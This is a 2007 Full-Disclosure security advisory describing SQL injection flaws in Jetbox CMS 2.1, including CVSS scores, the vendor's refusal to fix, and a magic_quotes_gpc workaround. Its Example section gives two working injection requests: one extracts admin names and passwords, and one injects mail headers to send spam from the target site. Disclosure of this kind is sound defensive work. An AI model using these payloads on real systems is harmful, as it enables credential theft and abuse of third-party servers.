netVigilance Security Advisory #28
Jetbox CMS version 2.1 Multiple SQL Injection Vulnerabilities
Description:
Jetbox CMS is seriously tested on usability & has a professional intuitive interface. The system is role based, with workflow and module orientated. All content is fully separated from layout. It uses php & mysql.
A security problem in the product allows attackers to commit SQL injection.
External References: 
Mitre CVE: CVE-2007-2685
NVD NIST: CVE-2007-2685
OSVDB: 34784
Summary: 
Jetbox CMS seriously tested on usability & has a professional intuitive interface. 
Successful exploitation requires PHP magic_quotes_gpc set to Off on the server.
Advisory URL: 
http://www.netvigilance.com/advisory0028
Release Date:
05/21/2007
Severity:
Risk: High
 
CVSS Metrics
Access Vector: Remote
Access Complexity: High
Authentication: Not-required
Confidentiality Impact: Complete
Integrity Impact: Partial
Availability Impact: Partial
Impact Bias: Confidentiality
CVSS Base Score: 6.8
 
Target Distribution on Internet: Low
 
Exploitability: Functional Exploit
Remediation Level: Workaround
Report Confidence: Uncorroborated
 
Vulnerability Impact: Attack
Host Impact: SQL Injection.
SecureScout Testcase ID:
Vulnerable Systems:
Jetbox CMS version 2.1
Vulnerability Type:
SQL injection allows malicious people to execute their own SQL scripts. This could be exploited to obtain sensitive data, modify database contents, sending anonymous emails to other recipients or acquire administrator's privileges.
Vendor: 
Streamedge Consultancy & Development
Vendor Status: 
Contact with the Vendor was established. The vendor refused to fix the issue and said that Jetbox is not maintained already. There is no official fix at the release of this Security Advisory.
Workaround:
In the php.ini file set magic_quotes_gpc = On.
Example: 
SQL Injection Vulnerability 1
REQUEST:
http://[TARGET]/[PRODUCT-DIRECTORY]/index.php?view=-1' UNION SELECT 1,CONCAT(`login`,'-',`user_password`),1,1,1,1,1,1,1,1,1,1 FROM `User` LIMIT 0,1%23
REPLY:
...<b>Warning</b>:  main([SQL INJECTION RESULT - ADMIN NAME]-[SQL INJECTION RESULT - ADMIN PASSWORD]): failed to open stream: No such file or directory in <b>[SERVER PATH][PRODUCT-DIRECTORY]index.php</b> on line <b>149</b><br />
...<b>Warning</b>:  main(): Failed opening '[SQL INJECTION RESULT - ADMIN NAME]-[SQL INJECTION RESULT - ADMIN PASSWORD]' for inclusion (include_path='.;c:php4pear;./;[SERVER PATH][PRODUCT-DIRECTORY]/includes') in <b>[SERVER PATH][PRODUCT-DIRECTORY]index.php</b> on line <b>149</b><br />
SQL Injection Vulnerability 2
REQUEST:
http://[TARGET]/[JETBOX-DIRECTORY]/index.php?view=webuser&task=sendpw&login=-1' UNION SELECT 1,1,1,'spam1@mail.com%0ABcc: spam_address2@somedomain.com, spam_address2@somedomain.com, spam_address4@somedomain.com, spam_addressN@somedomain.com%0ASubject: Some Spam Subject%0AFrom: any_address@somedomain.com%0AMIME-Version: 1.0%0AContent-Type: multipart/mixed; boundary=Hacker;%0A%0A--Hacker%0ASome Spam Message%0A%0AContent-Type:text/html;name=any_file.html;%0AContent-Transfer-Encoding:8bit%0AContent-Disposition: attachment%0A%0AHTML File%0A%0A--Hacker--%0AOther text will be hide',1 FROM `user` %23
REPLY:
Spam will be send from target site
Credits: 
Jesper Jurcenoks
Co-founder netVigilance, Inc
www.netvigilance.com

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
